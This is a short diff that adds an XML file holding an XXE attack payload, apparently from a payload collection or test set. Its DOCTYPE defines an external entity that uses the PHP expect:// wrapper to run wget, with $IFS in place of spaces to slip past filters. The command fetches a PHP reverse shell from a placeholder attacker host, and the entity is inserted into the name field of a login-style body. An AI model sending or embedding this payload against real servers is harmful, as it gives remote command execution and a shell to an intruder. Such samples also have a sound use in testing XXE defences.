@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [<!ENTITY a SYSTEM "expect://wget$IFS'attackerserver-php:8888/webshell/php-reverse-shell.php'">]>
+<root><name>tst &a;</name><password>tett</password></root>
